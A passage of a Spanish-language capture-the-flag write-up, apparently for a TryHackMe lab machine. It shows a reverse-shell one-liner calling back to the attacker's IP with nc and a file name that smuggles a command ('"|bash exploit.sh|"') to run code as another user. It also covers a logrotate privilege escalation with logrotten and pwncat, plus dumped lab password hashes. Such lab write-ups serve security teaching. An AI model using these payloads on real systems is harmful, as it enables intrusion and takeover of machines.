</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Feb  <span style=color:#ae81ff>4</span> 07:14  d9
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  da
</span></span><span style=display:flex><span>-rw-rw-rw-  <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>168</span> Jan <span style=color:#ae81ff>31</span> 10:52  warning.txt
</span></span></code></pre></div><p>Después de esto, creamos una shell reversa simple y lo copiamos en el directorio <code>home</code> del usuario, luego usamos la misma técnica para ejecutar este script como <code>plot_admin</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@plotted-lms://var/www/uploadedfiles/filedir$ echo <span style=color:#e6db74>&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.9.0.241 1338 &gt;/tmp/f&#34;</span> &gt; exploit.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>www-data@plotted-lms://var/www/uploadedfiles/filedir$ mv exploit.sh /home/plot_admin/exploit.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>www-data@plotted-lms://var/www/uploadedfiles/filedir$ echo <span style=color:#e6db74>&#34;test&#34;</span> &gt; <span style=color:#e6db74>&#39;&#34;|bash exploit.sh|&#34;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>www-data@plotted-lms://var/www/uploadedfiles/filedir$ ls -la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>48</span>
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> www-data www-data    <span style=color:#ae81ff>5</span> Apr <span style=color:#ae81ff>24</span> 09:30 <span style=color:#e6db74>&#39;&#34;|bash exploit.sh|&#34;&#39;</span>
</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> www-data www-data    <span style=color:#ae81ff>5</span> Apr <span style=color:#ae81ff>24</span> 09:30 <span style=color:#e6db74>&#39;&#34;|chmod -R 777 .|&#34;&#39;</span>
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>9</span> www-data www-data <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>24</span> 09:30  .
</span></span><span style=display:flex><span>drwxrwxrwx <span style=color:#ae81ff>10</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  ..
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  0c
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  5f
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  <span style=color:#ae81ff>75</span>
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  8c
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>24</span> 09:27  bf
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Feb  <span style=color:#ae81ff>4</span> 07:14  d9
</span></span><span style=display:flex><span>drwxrwxrwx  <span style=color:#ae81ff>3</span> www-data www-data <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>31</span> 10:54  da
</span></span><span style=display:flex><span>-rw-rw-rw-  <span style=color:#ae81ff>1</span> www-data www-data  <span style=color:#ae81ff>168</span> Jan <span style=color:#ae81ff>31</span> 10:52  warning.txt
</span></span></code></pre></div><p>Después de un minuto <em>(otra vez)</em> recibimos la conexión inversa</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ nc -nlvp <span style=color:#ae81ff>1338</span>                                                                                                                                                            
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1338</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.9.0.241<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.93.142<span style=color:#f92672>]</span> <span style=color:#ae81ff>52772</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>3138<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>plot_admin@plotted-lms:~$ id; whoami; pwd; cat /home/plot_admin/user.txt
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>plot_admin<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>plot_admin<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>plot_admin<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>plot_admin
</span></span><span style=display:flex><span>/home/plot_admin
</span></span><span style=display:flex><span>7<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>¡Sí! ¡Lo hicimos!</p><p>Ahora vamos a rootear esta máquina 😎</p><h2 id=root>Root</h2><p>Esta parte de la máquina, tomó un tiempo descifrarla, demasiado pensamiento :/</p><p>¡Pero lo dejarémos claro y directo!</p><p>Usamos <code>linpeas</code> para escanear la máquina y descubrimos lo siguiente:</p><p><code>Linpeas</code> nos muestra que hay un script que se ejecuta demasiadas veces durante de 1 minuto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>╔══════════╣ Different processes executed during <span style=color:#ae81ff>1</span> min <span style=color:#f92672>(</span>interesting is low number of repetitions<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>287</span> /lib/systemd/systemd --user
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>286</span> <span style=color:#f92672>(</span>sd-pam<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>     <span style=color:#ae81ff>31</span> /usr/bin/ssh root@127.0.0.1 . /etc/bash_completion
</span></span><span style=display:flex><span>     <span style=color:#ae81ff>31</span> /bin/sh -c /usr/bin/ssh root@127.0.0.1 <span style=color:#e6db74>&#39;. /etc/bash_completion&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Hay una secuencia de comandos que ejecuta <code>ssh</code> como root para <code>localhost</code> y pasa la carpeta <code>bash_completion</code> como argumento&mldr; Extraño&mldr;</p><p>Verificando los procesos de las máquinas descubrimos lo siguiente</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5322</span>     <span style=color:#ae81ff>597</span>  <span style=color:#ae81ff>0</span> 10:12 ?        00:00:00  <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5347</span>    <span style=color:#ae81ff>5322</span>  <span style=color:#ae81ff>0</span> 10:12 ?        00:00:00  |   <span style=color:#ae81ff>\_</span> /bin/sh -c /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5348</span>    <span style=color:#ae81ff>5347</span>  <span style=color:#ae81ff>0</span> 10:12 ?        00:00:02  |       <span style=color:#ae81ff>\_</span> /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5482</span>     <span style=color:#ae81ff>597</span>  <span style=color:#ae81ff>0</span> 10:13 ?        00:00:00  <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5548</span>    <span style=color:#ae81ff>5482</span>  <span style=color:#ae81ff>0</span> 10:13 ?        00:00:00  |   <span style=color:#ae81ff>\_</span> /bin/sh -c /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5558</span>    <span style=color:#ae81ff>5548</span>  <span style=color:#ae81ff>1</span> 10:13 ?        00:00:02  |       <span style=color:#ae81ff>\_</span> /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5633</span>     <span style=color:#ae81ff>597</span>  <span style=color:#ae81ff>0</span> 10:14 ?        00:00:00  <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5651</span>    <span style=color:#ae81ff>5633</span>  <span style=color:#ae81ff>0</span> 10:14 ?        00:00:00  |   <span style=color:#ae81ff>\_</span> /bin/sh -c /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5656</span>    <span style=color:#ae81ff>5651</span>  <span style=color:#ae81ff>1</span> 10:14 ?        00:00:01  |       <span style=color:#ae81ff>\_</span> /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5705</span>     <span style=color:#ae81ff>597</span>  <span style=color:#ae81ff>0</span> 10:15 ?        00:00:00  <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5817</span>    <span style=color:#ae81ff>5705</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  |   <span style=color:#ae81ff>\_</span> /bin/sh -c /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5832</span>    <span style=color:#ae81ff>5817</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  |       <span style=color:#ae81ff>\_</span> /usr/bin/python3 /home/plot_admin/backup.py
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5706</span>     <span style=color:#ae81ff>597</span>  <span style=color:#ae81ff>0</span> 10:15 ?        00:00:00  <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5781</span>    <span style=color:#ae81ff>5706</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  |   <span style=color:#ae81ff>\_</span> /bin/sh -c /usr/bin/ssh root@127.0.0.1 <span style=color:#e6db74>&#39;. /etc/bash_completion&#39;</span>
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5793</span>    <span style=color:#ae81ff>5781</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  |       <span style=color:#ae81ff>\_</span> /usr/bin/ssh root@127.0.0.1 . /etc/bash_completion
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5774</span>     <span style=color:#ae81ff>597</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>plot_ad+    <span style=color:#ae81ff>5851</span>    <span style=color:#ae81ff>5774</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  |   <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5775</span>     <span style=color:#ae81ff>597</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5840</span>    <span style=color:#ae81ff>5775</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  |   <span style=color:#ae81ff>\_</span> /bin/sh -c /usr/bin/ssh root@127.0.0.1 <span style=color:#e6db74>&#39;. /etc/bash_completion&#39;</span>
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5844</span>    <span style=color:#ae81ff>5840</span>  <span style=color:#ae81ff>1</span> 10:16 ?        00:00:00  |       <span style=color:#ae81ff>\_</span> /usr/bin/ssh root@127.0.0.1 . /etc/bash_completion
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5776</span>     <span style=color:#ae81ff>597</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00  <span style=color:#ae81ff>\_</span> /usr/sbin/CRON -f
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5845</span>    <span style=color:#ae81ff>5776</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00      <span style=color:#ae81ff>\_</span> /bin/sh -c /usr/local/sbin/logrotate -f /etc/logbackup.cfg
</span></span><span style=display:flex><span>root        <span style=color:#ae81ff>5848</span>    <span style=color:#ae81ff>5845</span>  <span style=color:#ae81ff>0</span> 10:16 ?        00:00:00          <span style=color:#ae81ff>\_</span> /usr/local/sbin/logrotate -f /etc/logbackup.cfg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>¡Hay un cronjob para <code>logrotate</code> en uso!</p><p>Sabemos que hay una manera de escalar privilegios con él, si se cumplen algunas condiciones&mldr;</p><p>¡Intentemos ver el archivo de configuración y la versión!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>remote<span style=color:#f92672>)</span> plot_admin@plotted-lms:/tmp$ ls -la /etc/logbackup.cfg
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>86</span> Feb  <span style=color:#ae81ff>6</span> 03:29 /etc/logbackup.cfg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>remote<span style=color:#f92672>)</span> plot_admin@plotted-lms:/tmp$ cat /etc/logbackup.cfg
</span></span><span style=display:flex><span>/home/plot_admin/.logs_backup/moodle_access <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    hourly
</span></span><span style=display:flex><span>    missingok
</span></span><span style=display:flex><span>    rotate <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span>    create
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>remote<span style=color:#f92672>)</span> plot_admin@plotted-lms:/tmp$ logrotate --version
</span></span><span style=display:flex><span>logrotate 3.15.0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Default mail command:       /bin/mail
</span></span><span style=display:flex><span>    Default compress command:   /bin/gzip
</span></span><span style=display:flex><span>    Default uncompress command: /bin/gunzip
</span></span><span style=display:flex><span>    Default compress extension: .gz
</span></span><span style=display:flex><span>    Default state file path:    /var/lib/logrotate.status
</span></span><span style=display:flex><span>    ACL support:                no
</span></span><span style=display:flex><span>    SELinux support:            no
</span></span></code></pre></div><p>¡¡Estupendo!! Tenemos la versión <code>3.15.0</code> (Vulnerable) y podemos leer el archivo de configuración, ¡el argumento <code>create</code> está en uso!</p><p>Si no sabe cómo explotar esta vulnerabilidad, <a href=https://medium.com/r3d-buck3t/linux-privesc-with-logrotate-utility-219b3aa7476b>aquí hay una buena explicación al respecto</a>.</p><p>Si no tiene ganas de leer tanto, aquí hay un breve resumen de lo que vamos a hacer:</p><p>Modificaremos el archivo (<code>/home/plot_admin/.logs_backup/moodle_access</code>) para que <code>logrotate</code> detecte este cambio y podamos obtener nuestra shell reversa. Para explotar esto, vamos a usar <a href=https://github.com/whotwagner/logrotten>logrotten</a>.</p><p><em>Por cierto, creé una shell reversa con el nombre <code>shell.sh</code> en la carpeta actual. (Lo siento, olvidé el fragmento :/)</em></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>========</span> Terminal 1 <span style=color:#f92672>=========</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>remote<span style=color:#f92672>)</span> plot_admin@plotted-lms:/tmp$ cp /home/plot_admin/.logs_backup/02.06.2022 /home/plot_admin/.logs_backup/moodle_access; ./logrotten -p shell.sh /home/plot_admin/.logs_backup/moodle_access
</span></span><span style=display:flex><span>Waiting <span style=color:#66d9ef>for</span> rotating /home/plot_admin/.logs_backup/moodle_access...
</span></span><span style=display:flex><span>Renamed /home/plot_admin/.logs_backup with /home/plot_admin/.logs_backup2 and created symlink to /etc/bash_completion.d
</span></span><span style=display:flex><span>Waiting <span style=color:#ae81ff>1</span> seconds before writing payload...
</span></span><span style=display:flex><span>Done!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>========</span> Terminal 2 <span style=color:#f92672>=========</span>
</span></span><span style=display:flex><span>╰─ pwncat-cs -lp <span style=color:#ae81ff>1338</span>                                                                                                                  ─╯
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>01:13:10 PM<span style=color:#f92672>]</span> Welcome to pwncat 🐈!                                                                                        __main__.py:164
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>01:13:58 PM<span style=color:#f92672>]</span> received connection from 10.10.37.208:51952                                                                       bind.py:84
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>01:14:00 PM<span style=color:#f92672>]</span> 10.10.37.208:51952: registered new host w/ db                                                                 manager.py:957
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>local<span style=color:#f92672>)</span> pwncat$ back
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>remote<span style=color:#f92672>)</span> root@plotted-lms:/root# id; whoami;pwd; cat /root/root.txt
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root
</span></span><span style=display:flex><span>/root
</span></span><span style=display:flex><span>Congratulations on completing this room!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag - 2<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hope you enjoyed the journey!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Do let me know <span style=color:#66d9ef>if</span> you have any ideas/suggestions <span style=color:#66d9ef>for</span> future rooms
</span></span><span style=display:flex><span>-sa.infinity8888
</span></span></code></pre></div><p>¡Y hemos rooteado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p><h2 id=posibles-agujeros-de-conejos-misc>Posibles agujeros de conejos (MISC)</h2><h3 id=rails>Rails</h3><p>En el puerto 873, hay una inyección de SQL en el parámetro SID, no necesita estar autenticado para explotarlo. (También hay 2-3 exploits más, pero el creador los parcheó)</p><p><a href=https://packetstormsecurity.com/files/165493/Online-Railway-Reservation-System-1.0-SQL-Injection.html>https://packetstormsecurity.com/files/165493/Online-Railway-Reservation-System-1.0-SQL-Injection.html</a></p><p>Aquí está el resultado, no pudimos descifrar ese hash :/</p><p>Si pudiste hacerlo, por favor pingeame y dime si hay algún otro exploit posible.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Database: orrs
</span></span><span style=display:flex><span>Table: users
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>1</span> entry<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+----------+----------------------------------+
</span></span><span style=display:flex><span>| username | password                         |
</span></span><span style=display:flex><span>+----------+----------------------------------+
</span></span><span style=display:flex><span>| admin    | 5765dcb76627ba4e2fd673e073def4ae |
</span></span><span style=display:flex><span>+----------+----------------------------------+
</span></span></code></pre></div><p>Además, si enumeras un poco más ese puerto, encontrarás el archivo <code>orrs_db.sql</code>, es la exportación de la base de datos <code>orrs</code>. Tiene algunas credenciales para los usuarios.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>+----------+---------------------------------------------+
</span></span><span style=display:flex><span>| username | password                                    |
</span></span><span style=display:flex><span>+----------+---------------------------------------------+
</span></span><span style=display:flex><span>| admin    | 0192023a7bbd73250516f069df18b500 <span style=color:#f92672>(</span>admin123<span style=color:#f92672>)</span> |
</span></span><span style=display:flex><span>| slou     | 1ed1255790523a907da869eab7306f5a <span style=color:#f92672>(</span>slou123<span style=color:#f92672>)</span>  |
</span></span><span style=display:flex><span>+----------+---------------------------------------------+
</span></span></code></pre></div><h3 id=general-404403503-errors>General 404/403/503 errors</h3><p>Cuando llegas a una página que no existe (error 404), te redirige a un link de Youtube :p</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ curl http://10.10.220.166:9020/notreal | base64 -d                                                                                  ─╯
</span></span><span style=display:flex><span>Try Harder!
</span></span><span style=display:flex><span>Anyways here you go :D
</span></span><span style=display:flex><span>https://www.youtube.com/watch?v<span style=color:#f92672>=</span>dQw4w9WgXcQ#
</span></span></code></pre></div><p>Y para que conste, porque no recuerdo la URL, hay un error que te dice que intentes con <code>admin:admin</code> -__-</p><h3 id=priv-escalation-a-root>Priv Escalation a root</h3><p>Existe este cronjob para root, pero creemos que es solo una agujero de conejo, no estábamos 100% seguros de eso, pero no encontramos ningún exploit/vulnerabilidad para esto.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>plot_admin@plotted-lms:~$ cat /etc/crontab
</span></span><span style=display:flex><span><span style=color:#75715e># /etc/crontab: system-wide crontab</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>* * * * *   root    /usr/bin/rsync /var/log/apache2/m*_access /home/plot_admin/.logs_backup/<span style=color:#66d9ef>$(</span>/bin/date +%m.%d.%Y<span style=color:#66d9ef>)</span>; /usr/bin/chown -R plot_admin:plot_admin /home/plot_admin/.logs_backup/<span style=color:#66d9ef>$(</span>/bin/date +%m.%d.%Y<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span></code></pre></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leer otros posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/es/posts/ollie/><span class=button__text>Ollie - Write Up</span>
<span class=button__icon>→</span></a></span></div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script><script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script><script type=module src=/assets/ionicons/ionicons.esm.js></script>
<script nomodule src=/assets/ionicons/ionicons.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script></body></html>